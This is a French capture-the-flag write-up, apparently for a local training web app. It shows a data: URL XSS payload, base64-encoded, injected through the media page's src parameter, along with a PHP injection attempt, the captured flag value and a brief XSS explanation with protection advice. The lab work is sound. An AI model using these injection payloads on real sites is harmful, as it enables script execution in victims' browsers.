on remarque, en inspectant, qu'une des images du main container est un lien vers la page media
egalement que si on modifie la source dans l'url la page indique Wrong answer

avec src=nsa
data=http://10.0.2.15/images/nsa_prism.jpg

avec src=eagle
data=eagle

on peut donc imaginer que la value data est directement lue par le back on essais donc dy injecter du php
http://localhost:8080/index.php?page=media&src=%3C?php%20echo(%27malware%27);%20?%3E

Wrong answer

About Base64
Base64 is a group of similar binary-to-text encoding schemes that represent binary data in an ASCII string format by translating it into a radix-64 representation. The term Base64 originates from a specific MIME content transfer encoding. Each base64 digit represents exactly 6 bits of data.

URL applications
Base64 encoding can be helpful when fairly lengthy identifying information is used in an HTTP environment. For example, a database persistence framework for Java objects might use Base64 encoding to encode a relatively large unique id (generally 128-bit UUIDs) into a string for use as an HTTP parameter in HTTP forms or HTTP GET URLs. Also, many applications need to encode binary data in a way that is convenient for inclusion in URLs, including in hidden web form fields, and Base64 is a convenient encoding to render them in a compact way.

Source: Wikipedia

Data URLs, URLs prefixed with the data: scheme, allow content creators to embed small files inline in documents. They were formerly known as "data URIs" until that name was retired by the WHATWG.

data:[<mediatype>][;base64],<data>

on essais donc d'injecter du php en base 64 dans l'url :
ici j'ai convertit <script>alert("test");<script/>
en base64 via https://www.base64decode.org/

http://localhost:8080/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgidGVzdCIpOzxzY3JpcHQvPg==

THE FLAG IS : 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D


DANGER :
XSS où « Cross-Site Scripting » est l’une des failles les plus répandues dans les sites Web dynamiques. Elle fait partie de la famille des attaques par injection.

une attaque par XSS se produit lorsqu’un utilisateur mal intentionné envoie un code nuisible qui sera exécuté par le navigateur ou l’interpréteur de la victime (HTML, XML, Flash, JavaScript, CSS, JSON, etc.) en utilisant des formulaires ou directement l’URL. L’exploitation de cette faille permettrait notamment d’exécuter des scripts douteux (dans le cas d’une injection JavaScript), de récupérer les informations récoltées sur un serveur distant (cookies, contenu de la page, etc.), de rediriger la victime, de défigurer la structure de la page, etc.

PROTECTON :
ne jamais trust les donnees recues d'un utilisateur. parse les URLs si on doit les utiliser (regex, escapeString etc)
